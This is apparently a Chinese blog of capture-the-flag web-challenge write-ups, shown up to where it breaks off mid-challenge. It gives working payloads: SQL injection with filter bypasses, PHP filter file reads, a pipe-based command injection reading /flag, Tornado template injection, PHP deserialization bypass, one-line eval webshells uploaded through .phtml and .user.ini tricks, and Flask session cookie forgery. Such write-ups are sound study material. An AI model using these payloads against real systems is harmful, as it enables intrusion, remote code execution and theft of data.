缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能\npayload\n1 1;set sql_mode=PIPES_AS_CONCAT;select 1 非预期解\n1 *,1 [ACTF2020 新生赛]Include 不截图了，进入靶机只有一个tips等着被点。跳转以后看url中参数\n1 ?file=flag.php 页面内容只有\nCan you find out the flag?\n立马想到使用php伪协议读文件内容。使用filter过滤器\n1 ?file=php://filter/convert.base64-encode/resource=flag.php 得到\n1 PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo= 解密得到flag\n[极客大挑战 2019]Secret File 查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。\n查看源码SECRET跳转的是action.php。\n但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。\nstristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。\n同样使用php伪协议filter过滤器读取文件\n1 ?file=php://filter/convert.base64-encode/resource=flag.php 1 PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 解密得到网页源码，flag在其中。\n[极客大挑战 2019]LoveSQL 顶端の告诫：用 sqlmap 是没有灵魂的\n尝试万能密码（其实没卵用）\n1 2 \u0026#39;or 1=1 # 任意密码 这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳\n字段数：\n1 1\u0026#39; order by 3 # 爆库：\n1 2 3 1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # geekuser,l0ve1ysq1 爆字段值：\n1 2 3 1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;l0ve1ysq1\u0026#39; # id,username,password 爆表：\n1 2 3 1\u0026#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 # \u0026#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}\u0026#39; 2021.01.21 [GXYCTF2019]Ping Ping Ping 传送门\n[ACTF2020 新生赛]Exec 肯定是尝试管道符\n1 127.0.0.1|cat /flag [护网杯 2018]easy_tornado 打开页面三个超链接\n/flag.txt\n/welcome.txt\nhints.txt\n内容分别是\nflag in /fllllllllllllag\nrender\nmd5(cookie_secret+md5(filename))\n进入hints.txt注意到url地址此时为\n1 /file?filename=/hints.txt\u0026amp;filehash=2a84a09bc1d5e3d8745131754ff208fa 再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供filehash值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称filename有了，接下来就是获取cookie_secret的值。\n接下来触及到盲区了，获取cookie_secret是看wp。\nrender是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用\n在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量\n获取cookie_secret的payload\n1 /error?msg={{handler.settings}} 获得cookie_secret的值为\n1 eb326d39-cd67-47bd-b2d3-71125996417b 根据hints.txt的url验证一下是如何加密的。\n选中的蓝色部分是/hints.txt加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：\n1 /file?filename=/hints.txt\u0026amp;filehash=2a84a09bc1d5e3d8745131754ff208fa [极客大挑战 2019]Knife 一句话直接连。\n[RoarCTF 2019]Easy Calc 一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：calc.php，但是也有一句很重要的注释\n1 \u0026lt;!--I\u0026#39;ve set up WAF to ensure security.--\u0026gt; php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为WAF，接下来是参考网上的wp自己的理解\n可以在calc.php传参\n1 ? num=a php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格\u0026rsquo; \u0026lsquo;会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。\n接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()\n查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）\u0026mdash;\u0026mdash;\u0026gt; \u0026lsquo;/\u0026rsquo; ：\n1 ? num=1;var_dump(scandir(chr(47))) 找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件\n1 ?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [极客大挑战 2019]Http 查看源码在\u0026quot;氛围\u0026quot;这两个字上有隐藏的跳转Secret.php。进入以后页面显示\n1 It doesn\u0026#39;t come from \u0026#39;https://www.Sycsecret.com\u0026#39; 提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示\n1 Please use \u0026#34;Syclover\u0026#34; browser 加上User-Agent。提示\n1 No!!! you can only read this locally!!! 加上X-Forwarded-For。HTTP X-Forwarded-For 介绍\n最终的请求头：\n1 2 3 4 5 6 7 8 9 10 GET /Secret.php HTTP/1.1 Host: node3.buuoj.cn:26715 Upgrade-Insecure-Requests: 1 User-Agent: Syclover Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 x-forwarded-for: 127.0.0.1 referer: https://www.Sycsecret.com Connection: close [极客大挑战 2019]PHP 源码备份在www.zip中。下载以后有五个文件\nclass.php\nflag.php\nindex.js\nindex.php\nstyle.css\n在index.php中有一段代码\n1 2 3 4 5 \u0026lt;?php include \u0026#39;class.php\u0026#39;; $select = $_GET[\u0026#39;select\u0026#39;]; $res=unserialize(@$select); ?\u0026gt; 再结合又一个class.php，所以这道题考点应该是反序列化。\nclass.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; error_reporting(0); class Name{ private $username = \u0026#39;nonono\u0026#39;; private $password = \u0026#39;yesyes\u0026#39;; public function __construct($username,$password){ $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } function __wakeup(){ $this-\u0026gt;username = \u0026#39;guest\u0026#39;; } function __destruct(){ if ($this-\u0026gt;password != 100) { echo \u0026#34;\u0026lt;/br\u0026gt;NO!!!hacker!!!\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You name is: \u0026#34;; echo $this-\u0026gt;username;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You password is: \u0026#34;; echo $this-\u0026gt;password;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; die(); } if ($this-\u0026gt;username === \u0026#39;admin\u0026#39;) { global $flag; echo $flag; }else{ echo \u0026#34;\u0026lt;/br\u0026gt;hello my friend~~\u0026lt;/br\u0026gt;sorry i can\u0026#39;t give you the flag!\u0026#34;; die(); } } } ?\u0026gt; 获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解CVE-2016-7124漏洞复现\n我使用的构造对象\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class Name{ private $username =\u0026#39;admin\u0026#39;; private $password =\u0026#39;100\u0026#39;; } $a = new Name; echo serialize($a); O:4:\u0026#34;Name\u0026#34;:2:{s:14:\u0026#34;%00Name%00username\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:14:\u0026#34;%00Name%00password\u0026#34;;s:3:\u0026#34;100\u0026#34;;} 反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload\n1 ?select=O:4:\u0026#34;Name\u0026#34;:3:{s:14:\u0026#34;%00Name%00username\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:14:\u0026#34;%00Name%00password\u0026#34;;s:3:\u0026#34;100\u0026#34;;} [极客大挑战 2019]Upload 先尝试上传一个gif图片马内容为\n1 2 3 GIF89a \u0026lt;?php @eval($_POST[\u0026#39;a\u0026#39;]); 页面提示过滤：\nNO! HACKER! your file included \u0026lsquo;\u0026lt;?\u0026rsquo;\n尝试script执行php代码\n1 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;eval($_POST[\u0026#39;cmd\u0026#39;])\u0026lt;/script\u0026gt; 可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。\n2021.01.28 [极客大挑战 2019]BabySQL 尝试万能密码，发现报错了：1=1#\u0026rsquo; and password=\u0026lsquo;123\u0026rsquo;，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有information这个词，其中的for也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。\n爆数据库（填密码）：\n1 1\u0026#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() # 爆表：\n1 1\u0026#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=\u0026#39;b4bsql\u0026#39; # 爆字段值：\n1 1\u0026#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql # [ACTF2020 新生赛]Upload 指针放在灯泡上护显示上传文件的，图片马\n233.gif\n1 2 3 GIF89a \u0026lt;?php @eval($_POST[\u0026#39;a\u0026#39;]); 尝试phtml是否被过滤，直接上传成功。蚁剑连接\n1 2 3 4 5 6 7 8 9 10 11 12 ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;233.phtml\u0026#34; Content-Type: image/gif GIF89a \u0026lt;?php @eval($_POST[\u0026#39;a\u0026#39;]); ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; upload ------WebKitFormBoundaryUMSByAQmR2cduL6R-- [ACTF2020 新生赛]BackupFile 1 Try to find out source file! 题目提示备份文件，备份文件常见后缀：\n.git .svn .swp .~ .bak .bash_history\n尝试index.php.bak，下载了一个备份文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php include_once \u0026#34;flag.php\u0026#34;; if(isset($_GET[\u0026#39;key\u0026#39;])) { $key = $_GET[\u0026#39;key\u0026#39;]; if(!is_numeric($key)) { exit(\u0026#34;Just num!\u0026#34;); } $key = intval($key); $str = \u0026#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\u0026#34;; if($key == $str) { echo $flag; } } else { echo \u0026#34;Try to find out source file!\u0026#34;; } 传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的==和===的区别。贴一段简单代码\n1 2 3 4 5 6 7 \u0026lt;?php $str = \u0026#39;abc\u0026#39;; if(0==$str){ echo \u0026#34;真\u0026#34;; }else{ echo \u0026#34;假\u0026#34;; } ==在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。\n全等于===操作过程如下：\n操作符两边的数据类型如果不相同，返回false 。 操作符两边的值如果不相同，返回false 。 最后将上面2步的操作进行与操作。返回与操作的结果。 所以最终的payload：\n1 ?key=123 [HCTF 2018]admin 可以在注释里找到\n思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。\npost。发表文章，但是没能找到在哪里打开 change password。改密码，尝试下能不能抓包改到admin的密码 修改密码抓到的包：\n感觉并没有什么下手的地方，唯一的就是session可能和身份有关。\n以下的是看网上的wp\n在change password页面查看源码，发现提供了题目的源码地址\n1 \u0026lt;!-- https://github.com/woadsl1234/hctf_flask/ --\u0026gt; 网站使用的是flask框架，具体路由表如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route(\u0026#39;/code\u0026#39;)\t#二维码 def get_code(): @app.route(\u0026#39;/index\u0026#39;)\t#首页 def index(): @app.route(\u0026#39;/register\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\t#注册 def register(): @app.route(\u0026#39;/login\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\t#登陆 def login(): @app.route(\u0026#39;/logout\u0026#39;)\t#登出 def logout(): @app.route(\u0026#39;/change\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\t#修改密码 def change(): @app.route(\u0026#39;/edit\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\t#编辑信息 def edit(): 解法一：flask session伪造 这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。\n贴两篇相关文章：\nPython Web之flask session\u0026amp;格式化字符串漏洞\n客户端 session 导致的安全问题\n首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。\n说明一下flask的session值加密格式是：SECRET_KEY +一个用户对象的字符串(就像PHP里的序列化后)。SECRET_KEY的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行\n1 SECRET_KEY = os.environ.get(\u0026#39;SECRET_KEY\u0026#39;) or \u0026#39;ckj123\u0026#39; 可以得知SECRET_KEY值为ckj123。然后在index.html页面发现只要session[‘name’] == \u0026lsquo;admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。\n如下 P师傅 的程序解密：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b\u0026#39;.\u0026#39;, 1) payload, timestamp = payload.rsplit(b\u0026#39;.\u0026#39;, 1) decompress = False if payload.startswith(b\u0026#39;.\u0026#39;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(\u0026#39;Could not base64 decode the payload because of \u0026#39; \u0026#39;an exception\u0026#39;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(\u0026#39;Could not zlib decompress the payload before \u0026#39; \u0026#39;decoding the payload\u0026#39;) return session_json_serializer.loads(payload) if __name__ == \u0026#39;__main__\u0026#39;: print(decryption(sys.argv[1].encode())) 执行命令\n1 python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA 结果\n1 {\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: b\u0026#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6\u0026#39;, \u0026#39;csrf_token\u0026#39;: b\u0026#39;895783633ba12f15aedff2c4b355f0e9cb3158ee\u0026#39;, \u0026#39;image\u0026#39;: b\u0026#39;AYHD\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;guobang\u0026#39;, \u0026#39;user_id\u0026#39;: \u0026#39;10\u0026#39;} 然后我们需要吧name的值修改为admin。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：flask-session-cookie-manager\n这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号\u0026quot;\u0026quot;括起来\npython flask_session_cookie_manager{2,3}.py {encode,decode}\n-s \u0026ldquo;SECRET_KEY\u0026rdquo;\t都需要使用 -c \u0026ldquo;Session cookie value\u0026rdquo;\tsession的值 只有解密decode用得到 -t \u0026ldquo;Session cookie structure\u0026rdquo; cookie结构 只有encode用得\n执行\n1 python flask_session_cookie_manager3.py encode -s \u0026#34;ckj123\u0026#34; -t \u0026#34;{\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: b\u0026#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6\u0026#39;, \u0026#39;csrf_token\u0026#39;: b\u0026#39;895783633ba12f15aedff2c4b355f0e9cb3158ee\u0026#39;, \u0026#39;image\u0026#39;: b\u0026#39;AYHD\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;user_id\u0026#39;: \u0026#39;10\u0026#39;}\u0026#34; 得到\n1 .eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg 放在请求头中，格式为\n1 cookie: session=加密内容 解法二：Unicode欺骗 第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为\nᴬᴰᴹᴵᴺ\u0026mdash;\u0026mdash;注册后\u0026mdash;\u0026mdash;\u0026gt;ADMIN\u0026mdash;修改密码\u0026mdash;\u0026gt;admin\npayload\n1 ᴬᴰᴹᴵᴺ 注册以后使用ᴬᴰᴹᴵᴺ登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。\n[极客大挑战 2019]BuyFlag 网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示\nOnly Cuit\u0026rsquo;s students can buy the FLAG\n应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!-- ~~~post money and password~~~ if (isset($_POST[\u0026#39;password\u0026#39;])) { $password = $_POST[\u0026#39;password\u0026#39;]; if (is_numeric($password)) { echo \u0026#34;password can\u0026#39;t be number\u0026lt;/br\u0026gt;\u0026#34;; }elseif ($password == 404) { echo \u0026#34;Password Right!\u0026lt;/br\u0026gt;\u0026#34;; } } 还记得php==关系运算会强制转换类型，用POST传一个password=404a，404a会被强制转换为404，密码就对上了。接下来是钱的问题，flag需要100000000块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，10e10，就是10的10次方，通过。最终的请求：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 POST /pay.php HTTP/1.1 Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Length: 25 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: user=1 Connection: close password=404a\u0026amp;money=10e10 [SUCTF 2019]CheckIn 知识点\n.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.\n准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：\n1 2 GIF89a auto_prepend_file=233.gif 接下来上传图片马，尝试了正常上传PHP马会提示：\n\u0026lt;? in contents!\n所以使用script马执行php：\n1 2 GIF89a \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;eval($_REQUEST[shell])\u0026lt;/script\u0026gt; 上传成功后会提示文件路径：\nYour dir uploads/852aff287f54bca0ed7757a702913e50 Your files : array(5) { [0]=\u0026gt; string(1) \u0026ldquo;.\u0026rdquo; [1]=\u0026gt; string(2) \u0026ldquo;..\u0026rdquo; [2]=\u0026gt; string(9) \u0026ldquo;.user.ini\u0026rdquo; [3]=\u0026gt; string(7) \u0026ldquo;233.gif\u0026rdquo; [4]=\u0026gt; string(9) \u0026ldquo;index.php\u0026rdquo; }\n这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(\u0026lsquo;cat /flag\u0026rsquo;)。\n[BJDCTF2020]Easy MD5 参考：\n【Jarvis OJ】Login\u0026ndash;password=\u0026rsquo;\u0026quot;.md5($pass,true).\u0026quot;\nsql注入：md5($password,true)\nLeet More 2010 Oh Those Admins! writeup\n随便输入一些东西都没有反应，在请求头中发现了一个Hint：\nselect * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,true)\n语法\nmd5(string,raw)\n参数 描述 string 必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 概括理解，这里如果raw参数为true的话，这个函数的返回值是string的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是ffifdyop，我们来对它进行一波操作\n源字符串：ffifdyop\nmd5加密值：276f722736c95d99e921722cf9ed621c\nhex解码：\u0026lsquo;or'6É].é!r,ùíb.\n最后那几个应该是不可见字符，重要的是前面一段：'or'6，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个'单引号。执行以后真正的sql语句为\n1 select * from \u0026#39;admin\u0026#39; where password=\u0026#39;\u0026#39;or\u0026#39;6É].é!r,ùíb.‘ 可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：\na string starting with a 1 is cast as an integer when used as a boolean.\n在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。\n自己进行的测试：\n所以真正的解法是只要sql语句的格式为password=\u0026lsquo;xxxxxxxx\u0026rsquo; or \u0026lsquo;1xxxx\u0026rsquo;，即hex包含字符串\u0026quot;276f722731\u0026quot;（\u0026lsquo;or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。\n下面这个程序是这道题开头参考列表中的第三个链接。\n1 2 3 4 5 6 7 8 \u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; 这个程序遍历数字进行md5加密，使用stripos匹配是否有'or'，这个函数有一个弊病就是如果是以'or'开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由\\'or\\'改为'or'([1-9]+|0+[1-9]) 不过我的方法自己还没跑出来🤣，回头加个多线程试一试\n（更新）\n自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 找到了md5(2413633098): 找到了md5(5207660362): 找到了md5(8351555222): 找到了md5(13095770027): 找到了md5(14860117901): 找到了md5(15724086109): 找到了md5(16529176061): 找到了md5(17428338265): 找到了md5(18717303578): 找到了md5(19342380396): 找到了md5(23960028257): 找到了md5(32561902614): 找到了md5(38983153698): 找到了md5(39742292223): 找到了md5(44120894060): 找到了md5(44820604888): 找到了md5(45570673322): 找到了md5(45855250502): 找到了md5(53660569009): 找到了md5(55098175010): 找到了md5(59763304323): 找到了md5(60185044906): 找到了md5(68625783421): 找到了md5(70949326264): (md5值删了，因为乱码会影响博客的搜索功能) 程序源码如下（自己写着玩，轻喷）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # codeing = utf-8 import threading import hashlib import re import itertools import time # r\u0026#39;\\\u0026#39;or\\\u0026#39;([1-9]+|0+[1-9])\u0026#39; # r\u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39; pattern=re.compile(r\u0026#39;\\\u0026#39;or\\\u0026#39;([1-9]+|0+[1-9])\u0026#39;,re.I) item = itertools.count(1) def thrfunc(): while 1: s2 = \u0026#39;\u0026#39; temp = str(next(item)) s1 = hashlib.md5(temp.encode(encoding=\u0026#39;UTF-8\u0026#39;)).hexdigest() for i in range(0, len(s1), 2): s2 = s2 + chr(int(s1[i:i + 2], 16)) if re.search(pattern, s2): print(\u0026#34;找到了md5(\u0026#34; + temp + \u0026#34;): \u0026#34; + s2) threads=[] for i in range(10): t = threading.Thread(target=thrfunc) threads.append(t) t.start() 虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。\n还有一个能用的md5值：\n1 2 3 4 content: 129581926211651571912466741651878684928 hex: 06da5430449f8f6f23dfc1276f722738 raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1\u0026#39;or\u0026#39;8 string: T0Do#\u0026#39;or\u0026#39;8 以上是第一层。其实看了源码里只验证了字符串是否等于ffifdyop我写的脚本里的值肯定通过不了\n第二层可以直接在源码中看到注释。\n1 2 3 4 5 $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. 简单的md5以0E开头\n1 a=QNKCDZO\u0026amp;b=240610708 第三层\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); 